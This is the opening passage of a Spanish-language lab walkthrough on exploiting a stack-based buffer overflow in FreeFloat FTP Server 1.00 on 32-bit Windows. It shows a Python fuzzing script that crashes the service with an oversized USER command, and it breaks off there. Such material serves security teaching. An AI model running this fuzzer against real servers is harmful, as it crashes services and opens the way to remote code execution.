# 💥 Caso Práctico A: Stack-Based Buffer Overflow

## 1️⃣ Contexto

**Objetivo:** demostrar la explotación de un desbordamiento de búfer clásico mediante un binario vulnerable (por ejemplo, *FreeFloat FTP Server 1.00* o un binario de laboratorio).

**Tipo de vulnerabilidad:** Stack-Based Buffer Overflow  
**Sistema:** Windows (32 bits)  
**Herramientas:** Immunity Debugger, Mona.py, Python (pwntools)

---

## 2️⃣ Identificación de la vulnerabilidad

El fuzzing con un script simple en Python reveló que el servicio FTP colapsaba al recibir una cadena de más de 2300 bytes en el comando `USER`.

```python
import socket

buffer = b"A" * 3000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.31", 21))
s.recv(1024)
s.send(b"USER " + buffer + b"\r\n")
s.close()
